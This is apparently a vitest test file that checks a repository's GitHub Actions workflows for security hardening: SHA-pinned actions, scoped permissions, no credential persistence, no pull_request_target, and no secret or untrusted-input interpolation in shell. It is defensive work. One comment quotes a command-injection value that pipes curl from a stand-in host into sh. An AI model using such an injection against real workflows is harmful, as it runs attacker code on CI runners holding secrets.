import { existsSync, readFileSync } from 'node:fs'
import { readdir } from 'node:fs/promises'
import { join } from 'node:path'
import { describe, expect, it } from 'vitest'

/**
 * Guard the CI/CD workflows against silently losing the hardening added 2026-08-12.
 *
 * WHY A TEST AND NOT A REVIEW. Every property below is invisible in the thing it
 * protects: a workflow with a mutable action tag, an over-permissioned token or an
 * interpolated shell string runs exactly as green as a hardened one. There is no
 * failing output to notice. The only moment the difference shows is the moment it
 * is being exploited, and by then the evidence is in someone else's logs.
 *
 * This repository has already been bitten by the general shape twice, both recorded
 * in CLAUDE.md: the alerting branch of uptime.yml was silently disabled for 17 days
 * because nothing exercised the path that only runs when things are broken, and
 * gitleaks lived in its own workflow where `needs:` could not reach it, so a commit
 * carrying a live key was scanned, flagged red, and deployed anyway. Both were
 * "obviously fine" until measured.
 *
 * WHY IT LIVES IN apps/cms. Same reasoning as claudeMd.test.ts and
 * mediaReferences.test.ts: this is a repo-wide check belonging to no app, and
 * apps/cms is the workspace that both runs vitest and carries node types.
 * `packages/shared` deliberately has neither, so node globals cannot leak into code
 * the Workers import.
 *
 * WHY LINE-BASED AND NOT A YAML PARSER. No workspace here depends on a YAML library;
 * the only copy present is a transitive of something else, and a guard that silently
 * stops running when an unrelated dependency is pruned is worse than no guard.
 * scripts/test-alert-shell.sh reads workflow shell back out with awk for the same
 * reason.
 */

const REPO_ROOT = join(import.meta.dirname, '..', '..', '..')
const WORKFLOW_DIR = join(REPO_ROOT, '.github', 'workflows')

async function workflowFiles(): Promise<string[]> {
  const names = await readdir(WORKFLOW_DIR)
  return names.filter((n) => n.endsWith('.yml') || n.endsWith('.yaml')).sort()
}

function read(name: string): string {
  return readFileSync(join(WORKFLOW_DIR, name), 'utf8')
}

/**
 * Jobs declared in ci.yml, and the job list in `deploy.needs`.
 *
 * Pure functions on a source string, like jobsWithoutTimeout above, so the negative
 * control can run them against a synthetic workflow instead of against the repo.
 */
function declaredJobs(source: string): string[] {
  const lines = source.split('\n')
  const jobsAt = lines.findIndex((l) => /^jobs:\s*$/.test(l))
  if (jobsAt === -1) return []
  const out: string[] = []
  for (const line of lines.slice(jobsAt + 1)) {
    if (/^\S/.test(line)) break
    const match = /^ {2}([A-Za-z0-9_-]+):\s*$/.exec(line)
    if (match?.[1]) out.push(match[1])
  }
  return out
}

function deployNeeds(source: string): string[] {
  const match = /^\s*needs:\s*\[([^\]]*)\]/m.exec(source)
  if (!match?.[1]) return []
  return match[1]
    .split(',')
    .map((s) => s.trim())
    .filter(Boolean)
}

/**
 * Versions in a `container:` `image: .../playwright:vX.Y.Z-suffix` line.
 *
 * Kept as a pure function on a source string, like jobsWithoutTimeout above, so the
 * negative control can prove it distinguishes a match from a mismatch instead of
 * returning [] for everything.
 */
function playwrightImageVersions(source: string): string[] {
  return [...source.matchAll(/image:\s*\S*playwright:v(\d+\.\d+\.\d+)\b/g)]
    .map((m) => m[1])
    .filter((v): v is string => v !== undefined)
}

/**
 * Job keys (two-space indent under `jobs:`) that declare no `timeout-minutes`.
 *
 * Exported shape kept simple — takes a source string, returns job names — so the
 * negative controls below can run it against a synthetic workflow rather than
 * against the repo, which is the only way to prove it can fail.
 */
function jobsWithoutTimeout(source: string): string[] {
  const lines = source.split('\n')
  const jobsAt = lines.findIndex((l) => /^jobs:\s*$/.test(l))
  if (jobsAt === -1) return []

  const offenders: string[] = []
  let current: string | null = null
  let hasTimeout = false

  const close = () => {
    if (current && !hasTimeout) offenders.push(current)
  }

  for (let i = jobsAt + 1; i < lines.length; i++) {
    const line = lines[i]!
    const header = line.match(/^ {2}([A-Za-z_][\w-]*):\s*$/)
    if (header) {
      close()
      current = header[1]!
      hasTimeout = false
      continue
    }
    // A non-indented line ends the jobs block entirely.
    if (line.trim() !== '' && !/^\s/.test(line)) break
    if (current && /^ {4}timeout-minutes:\s*\d+/.test(line)) hasTimeout = true
  }
  close()
  return offenders
}

/**
 * Lines belonging to a `run:` block — i.e. shell. Everything else in a workflow is
 * expression context, where `${{ }}` is evaluated by Actions rather than pasted into
 * a shell, and is therefore not an injection site.
 *
 * A `run:` block is the run line itself plus every following line indented deeper
 * than the key. Blank lines do not end it; a line at or below the key's indent does.
 */
function shellLines(source: string): { line: string; number: number }[] {
  const lines = source.split('\n')
  const out: { line: string; number: number }[] = []
  let blockIndent: number | null = null

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i]!
    const runMatch = line.match(/^(\s*)(?:- )?run:/)

    if (runMatch) {
      blockIndent = runMatch[1]!.length
      out.push({ line, number: i + 1 })
      continue
    }
    if (blockIndent === null) continue
    if (line.trim() === '') continue

    const indent = line.length - line.trimStart().length
    if (indent > blockIndent) {
      out.push({ line, number: i + 1 })
    } else {
      blockIndent = null
    }
  }
  return out
}

describe('workflow hardening', () => {
  it('has workflows to check (the guard must not pass by finding nothing)', async () => {
    const files = await workflowFiles()
    expect(files.length).toBeGreaterThanOrEqual(6)
  })

  /**
   * A mutable tag (`@v7`) is a promise by the action's owner that they will not push
   * anything hostile to it. That promise held for `tj-actions/changed-files` right up
   * until March 2025, when a compromised token retagged every version to a payload
   * that dumped runner memory — including secrets — into build logs, across tens of
   * thousands of repositories at once. A commit SHA cannot be retagged.
   *
   * The `# vX.Y.Z` comment is not decoration: it is the only thing that makes the pin
   * legible in review, and Dependabot reads and rewrites it when it bumps the SHA.
   */
  it('pins every action to a full commit SHA with a version comment', async () => {
    const offenders: string[] = []

    for (const file of await workflowFiles()) {
      read(file)
        .split('\n')
        .forEach((line, i) => {
          const m = line.match(/^\s*(?:-\s*)?uses:\s*(\S+)(.*)$/)
          if (!m) return
          const ref = m[1]!
          const rest = m[2] ?? ''

          // Local composite actions (./.github/…) and docker:// refs are not tags.
          if (ref.startsWith('./') || ref.startsWith('docker://')) return

          const pinned = /@[0-9a-f]{40}$/.test(ref)
          const commented = /#\s*v\d+\.\d+\.\d+/.test(rest)

          if (!pinned) offenders.push(`${file}:${i + 1} not SHA-pinned -> ${ref}`)
          else if (!commented)
            offenders.push(`${file}:${i + 1} SHA-pinned but no "# vX.Y.Z" comment -> ${ref}`)
        })
    }

    expect(offenders, offenders.join('\n')).toEqual([])
  })

  /**
   * ⚠️ A `permissions:` block REPLACES the default grants rather than adding to them,
   * which is why this asserts PRESENCE and `contents`, not a maximal list. Getting
   * this wrong is the failure uptime.yml actually had: a block listing only
   * `issues: write` set `contents` to none, and `actions/checkout` on this private
   * repo then failed with "Repository not found" — a 404, so it read as a deleted
   * repository rather than a permissions problem, and the monitor was dead for ~23
   * hours while its failures looked like ordinary uptime alerts.
   */
  it('declares a top-level permissions block, including contents, in every workflow', async () => {
    const offenders: string[] = []

    for (const file of await workflowFiles()) {
      const source = read(file)
      // Top-level keys are at column 0.
      const hasTopLevel = /^permissions:\s*$/m.test(source)
      if (!hasTopLevel) {
        offenders.push(`${file}: no top-level "permissions:" block`)
        continue
      }
      const block = source.split(/^permissions:\s*$/m)[1] ?? ''
      const body = block.split(/\n(?=\S)/)[0] ?? ''
      if (!/^\s+contents:\s*(read|write)/m.test(body)) {
        offenders.push(
          `${file}: permissions block does not set "contents" — a block REPLACES the ` +
            `defaults, so omitting it sets contents:none and breaks actions/checkout ` +
            `with a 404 on this private repo`,
        )
      }
    }

    expect(offenders, offenders.join('\n')).toEqual([])
  })

  /**
   * `github.event.*` and `github.head_ref` are attacker-influenced strings. Inside a
   * `run:` block, `${{ }}` is textually substituted BEFORE the shell sees it, so a
   * value of `"; curl evil.sh | sh; #` executes. Passing it through `env:` and
   * referencing `"$VAR"` is inert no matter what the value contains.
   *
   * Found live in uptime.yml on 2026-08-12: `if [ "${{ github.event.inputs.target }}"
   * = "" ]` in a job holding GH_TOKEN. Only a write-access user could trigger it, so
   * it was never externally reachable — it is fixed, and pinned here, because the
   * shape is the bug and the next person to copy the block may be less lucky.
   *
   * `github.event_name` is deliberately NOT flagged: it is a fixed enum set by the
   * platform, not by any user.
   */
  it('never interpolates attacker-influenced context inside a run: block', async () => {
    const offenders: string[] = []
    const dangerous = /\$\{\{\s*github\.(event\.|head_ref)/

    for (const file of await workflowFiles()) {
      for (const { line, number } of shellLines(read(file))) {
        // Comments inside a run block are shell comments — still substituted, but
        // harmless, and this repo comments heavily. Skip pure comment lines.
        if (line.trim().startsWith('#')) continue
        if (dangerous.test(line)) {
          offenders.push(`${file}:${number} -> ${line.trim()}`)
        }
      }
    }

    expect(
      offenders,
      `Interpolated untrusted context into shell. Pass it via env: and use "$VAR":\n${offenders.join('\n')}`,
    ).toEqual([])
  })

  /**
   * `actions/checkout` writes the job's token into `.git/config` by default, where
   * any code the job later runs can read it. These jobs run `pnpm install`, a build
   * and three test suites — thousands of third-party packages. No workflow here
   * pushes, so nothing needs the credential to persist.
   */
  it('sets persist-credentials: false on every checkout', async () => {
    const offenders: string[] = []

    for (const file of await workflowFiles()) {
      const lines = read(file).split('\n')
      lines.forEach((line, i) => {
        if (!/^\s*-\s*uses:\s*actions\/checkout@/.test(line)) return
        // Look ahead within this step: stop at the next step (`- ` at same indent).
        const indent = line.length - line.trimStart().length
        let found = false
        for (let j = i + 1; j < lines.length; j++) {
          const next = lines[j]!
          if (next.trim() === '') continue
          const nextIndent = next.length - next.trimStart().length
          if (nextIndent <= indent && next.trimStart().startsWith('- ')) break
          if (nextIndent < indent) break
          if (/persist-credentials:\s*false/.test(next)) {
            found = true
            break
          }
        }
        if (!found) offenders.push(`${file}:${i + 1} checkout without persist-credentials: false`)
      })
    }

    expect(offenders, offenders.join('\n')).toEqual([])
  })

  /**
   * Every `pnpm <script>` a workflow invokes must exist in the package.json it
   * resolves against.
   *
   * This is the cheap half of a real failure mode: a script renamed in package.json
   * breaks CI at the step that runs it, which is minutes into a run and after a push,
   * rather than here in milliseconds. It also catches the reverse — a workflow step
   * copied between files that references a script the target package does not have.
   */
  it('only invokes pnpm scripts that exist', async () => {
    // pnpm's own subcommands, which are not package scripts.
    const BUILTINS = new Set([
      'install',
      'exec',
      'add',
      'remove',
      'update',
      'dlx',
      'why',
      'store',
      'config',
      'list',
      'audit',
      'publish',
      'pack',
      'link',
      'prune',
      'rebuild',
      'run',
    ])

    const scriptsOf = (pkgJsonPath: string): Set<string> => {
      if (!existsSync(pkgJsonPath)) return new Set()
      const pkg = JSON.parse(readFileSync(pkgJsonPath, 'utf8')) as {
        scripts?: Record<string, string>
      }
      return new Set(Object.keys(pkg.scripts ?? {}))
    }

    const rootScripts = scriptsOf(join(REPO_ROOT, 'package.json'))

    // name -> scripts, for every workspace package.
    const byName = new Map<string, Set<string>>()
    for (const dir of ['apps', 'packages', 'tools']) {
      const base = join(REPO_ROOT, dir)
      if (!existsSync(base)) continue
      for (const entry of await readdir(base)) {
        const p = join(base, entry, 'package.json')
        if (!existsSync(p)) continue
        const pkg = JSON.parse(readFileSync(p, 'utf8')) as { name?: string }
        if (pkg.name) byName.set(pkg.name, scriptsOf(p))
      }
    }

    const offenders: string[] = []
    const invocation =
      /\bpnpm\s+(?:(?:--filter|-F)\s+(\S+)\s+)?(?:(-r|--recursive)\s+)?(?:run\s+)?([a-z][\w:.-]*)/g

    for (const file of await workflowFiles()) {
      for (const { line, number } of shellLines(read(file))) {
        if (line.trim().startsWith('#')) continue
        for (const m of line.matchAll(invocation)) {
          const filter = m[1]
          const script = m[3]!
          if (BUILTINS.has(script)) continue

          const available = filter ? byName.get(filter) : rootScripts
          if (!available) {
            offenders.push(`${file}:${number} --filter ${filter} is not a workspace package`)
            continue
          }
          if (!available.has(script)) {
            offenders.push(
              `${file}:${number} pnpm ${filter ? `--filter ${filter} ` : ''}${script} — no such script`,
            )
          }
        }
      }
    }

    expect(offenders, offenders.join('\n')).toEqual([])
  })

  /**
   * Every job must cap its own runtime.
   *
   * NOT A HYPOTHETICAL HERE. ci.yml's own comment records run 31091024563, where the
   * Playwright browser install — a step measured at 49 seconds on a healthy runner —
   * ran for 30+ MINUTES before the run was cancelled by hand. GitHub Actions reported
   * no incident. Without `timeout-minutes` a hung job runs to the platform default of
   * SIX HOURS, and on a private repo those are billed minutes.
   *
   * The second reason is the one that matters more: `concurrency.cancel-in-progress`
   * means a hung run on `main` holds the slot, so the deploy of the fix queues behind
   * the hang. A capped job fails, and a failure is visible; a hang is not.
   */
  it('caps every job with timeout-minutes', async () => {
    const offenders: string[] = []

    for (const file of await workflowFiles()) {
      for (const job of jobsWithoutTimeout(read(file))) {
        offenders.push(`${file}: job "${job}" has no timeout-minutes`)
      }
    }

    expect(
      offenders,
      'A job with no timeout-minutes runs to the 6-hour platform default when it hangs.\n' +
        `${offenders.join('\n')}`,
    ).toEqual([])
  })

  it('the timeout check can actually fail (negative control)', () => {
    const missing = `
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo hi
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - run: echo hi
`
    // Proves the parser distinguishes the two rather than returning [] for everything —
    // the failure mode that would make the assertion above decorative. `build` lacks a
    // timeout and is reported; `test` has one and is not.
    expect(jobsWithoutTimeout(missing)).toEqual(['build'])

    const fixed = missing.replace(
      '  build:\n    runs-on: ubuntu-latest\n',
      '  build:\n    runs-on: ubuntu-latest\n    timeout-minutes: 5\n',
    )
    expect(fixed, 'the replacement must actually have changed the source').not.toBe(missing)
    expect(jobsWithoutTimeout(fixed)).toEqual([])
  })

  /**
   * `pull_request_target` runs with the BASE repository's token and secrets while
   * checking out a fork's code. It is the single most exploited GitHub Actions
   * misconfiguration, and its danger is entirely invisible in the diff that adds it —
   * the workflow simply starts working for fork PRs, which is usually why someone
   * reached for it.
   *
   * There is no legitimate use for it here: this repo takes no fork contributions and
   * `ci.yml` already handles `pull_request` correctly.
   */
  it('uses no pull_request_target trigger', async () => {
    const offenders: string[] = []

    for (const file of await workflowFiles()) {
      read(file)
        .split('\n')
        .forEach((line, i) => {
          if (/^\s*pull_request_target:/.test(line)) offenders.push(`${file}:${i + 1}`)
        })
    }

    expect(
      offenders,
      'pull_request_target runs untrusted fork code with write-scoped secrets. Use ' +
        `pull_request.\n${offenders.join('\n')}`,
    ).toEqual([])
  })

  /**
   * A secret interpolated into a `run:` block is pasted into the shell before the
   * shell sees it, so it lands in `set -x` output, in an error message that echoes the
   * command, and in any process listing. Passing it via `env:` and referencing `"$VAR"`
   * keeps it out of the command line entirely — which is what every deploy step in
   * this repo already does. This pins that rather than relying on it continuing.
   *
   * Same mechanism as the `github.event.*` rule above; different blast radius.
   */
  it('never interpolates a secret inside a run: block', async () => {
    const offenders: string[] = []

    for (const file of await workflowFiles()) {
      for (const { line, number } of shellLines(read(file))) {
        if (line.trim().startsWith('#')) continue
        if (/\$\{\{\s*secrets\./.test(line)) offenders.push(`${file}:${number} -> ${line.trim()}`)
      }
    }

    expect(
      offenders,
      'Secrets must reach a run: block through env:, never by interpolation — an ' +
        `interpolated secret appears in the command line.\n${offenders.join('\n')}`,
    ).toEqual([])
  })

  it('the secret-interpolation check can actually fail (negative control)', () => {
    const bad = `
jobs:
  deploy:
    steps:
      - run: curl -H "Authorization: \${{ secrets.TOKEN }}" https://example.com
`
    const hits = shellLines(bad).filter((l) => /\$\{\{\s*secrets\./.test(l.line))
    expect(hits).toHaveLength(1)

    const good = `
jobs:
  deploy:
    steps:
      - env:
          TOKEN: \${{ secrets.TOKEN }}
        run: curl -H "Authorization: $TOKEN" https://example.com
`
    // The safe form must NOT trip it, or the rule would be unfollowable.
    expect(shellLines(good).filter((l) => /\$\{\{\s*secrets\./.test(l.line))).toEqual([])
  })

  /**
   * NINTH RULE, added 2026-08-20 with the first container job.
   *
   * `artwork` stopped installing Chromium through apt and now runs inside
   * `mcr.microsoft.com/playwright:v1.62.1-noble`, which SHIPS the browsers. The image
   * supplies them; `@playwright/test` drives them. If the two drift, nothing fails at
   * lint or typecheck — it fails at RUNTIME, on whichever unrelated PR happens to bump
   * the package, with `browser not found at /ms-playwright/...`. That is an expensive
   * place to learn about a version bump, and it is exactly the shape of the
   * `apps/shrink/container` lockfile trap: two files that must agree, with no tooling
   * that makes them.
   *
   * A TAG and not a digest, deliberately: `.github/dependabot.yml` declares no docker
   * ecosystem, so a digest pin would go stale in silence with nothing to notice. The
   * tag is legible and this test is what keeps it honest.
   */
  it('pins every Playwright container image to the declared @playwright/test version', async () => {
    const declared = new Set<string>()
    for (const pkg of ['apps/viewer/package.json', 'tools/asset-pipeline/package.json']) {
      const json = JSON.parse(readFileSync(join(REPO_ROOT, pkg), 'utf8'))
      const version =
        json.devDependencies?.['@playwright/test'] ?? json.dependencies?.['@playwright/test']
      if (version) declared.add(String(version).replace(/^[^\d]*/, ''))
    }

    // dependencyPolicy.test.ts already forbids two workspaces declaring different
    // versions of a shared dependency, so this is a set of one. Assert it rather than
    // assume it: if that ever changes, "the declared version" stops meaning anything
    // and this gate must be rewritten, not silently pick whichever came first.
    expect([...declared], 'workspaces disagree on @playwright/test').toHaveLength(1)
    const expected = [...declared][0]

    const offenders: string[] = []
    for (const file of await workflowFiles()) {
      for (const found of playwrightImageVersions(read(file))) {
        if (found !== expected)
          offenders.push(`${file}: container image v${found} != @playwright/test ${expected}`)
      }
    }

    expect(
      offenders,
      'A container image and @playwright/test have drifted. The image SHIPS the browsers;\n' +
        'a mismatch fails at runtime with "browser not found at /ms-playwright/...".\n' +
        'Bump the image tag in the workflow and the package together.\n' +
        `${offenders.join('\n')}`,
    ).toEqual([])
  })

  it('the Playwright image check can actually fail (negative control)', () => {
    // Without this the assertion above passes for a repo with no container at all,
    // which is indistinguishable from a parser that returns [] for everything — the
    // failure mode the timeout rule's control was written to catch.
    const drifted = `
jobs:
  artwork:
    container:
      image: mcr.microsoft.com/playwright:v1.60.0-noble
  other:
    runs-on: ubuntu-latest
`
    expect(playwrightImageVersions(drifted)).toEqual(['1.60.0'])
    expect(playwrightImageVersions(drifted.replace('v1.60.0', 'v1.62.1'))).toEqual(['1.62.1'])
    expect(playwrightImageVersions('jobs:\n  a:\n    runs-on: ubuntu-latest\n')).toEqual([])
  })
  /**
   * TENTH RULE, added 2026-08-20 when `e2e` was split out of `verify`.
   *
   * A gate that stops gating is this repo's most repeated CI failure: a rename broke a
   * post-deploy gate on 2026-08-15, and again on 2026-08-17. Splitting a job is the
   * same hazard with a different cause — `e2e` was gating because it lived INSIDE
   * `verify`, and the moment it became its own job that stopped being true unless
   * someone remembered `deploy.needs`.
   *
   * So the invariant is stated positively: every job must gate the deploy unless it is
   * on the allow-list below. Adding a job now fails this test until you decide, in
   * writing, which it is.
   *
   * ⚠️ THIS COVERS ONLY HALF THE PROBLEM. The `main` ruleset's required-status-checks
   * list is the other place a gate must be named, and it is org configuration this
   * test cannot read. `needs:` stops the DEPLOY; the ruleset stops the MERGE.
   */
  it('gates the deploy on every job except the declared non-gating ones', async () => {
    // `lighthouse` is deliberately non-gating and ci.yml says why: its category scores
    // swung 0.64/0.88/0.87 across three runs of an identical build, and "a Chrome flake
    // must never block a live release". Anything else added here needs the same kind of
    // written reason beside the job.
    const NON_GATING = new Set(['deploy', 'lighthouse'])

    const source = read('ci.yml')
    const needs = new Set(deployNeeds(source))
    const ungated = declaredJobs(source).filter((job) => !NON_GATING.has(job) && !needs.has(job))

    expect(
      ungated,
      'A ci.yml job does not gate the deploy. Add it to `deploy.needs` — AND to the\n' +
        "`main` ruleset's required status checks, which this test cannot see — or add it\n" +
        'to NON_GATING here with the reason written beside the job.\n' +
        `${ungated.join('\n')}`,
    ).toEqual([])
  })

  it('the deploy-gating check can actually fail (negative control)', () => {
    const source = `
jobs:
  verify:
    runs-on: ubuntu-latest
  e2e:
    runs-on: ubuntu-latest
  lighthouse:
    runs-on: ubuntu-latest
  deploy:
    needs: [verify]
    runs-on: ubuntu-latest
`
    expect(declaredJobs(source)).toEqual(['verify', 'e2e', 'lighthouse', 'deploy'])
    expect(deployNeeds(source)).toEqual(['verify'])
    // e2e is ungated and must be reported; lighthouse and deploy are allow-listed.
    const NON_GATING = new Set(['deploy', 'lighthouse'])
    const needs = new Set(deployNeeds(source))
    expect(declaredJobs(source).filter((j) => !NON_GATING.has(j) && !needs.has(j))).toEqual(['e2e'])
  })
})
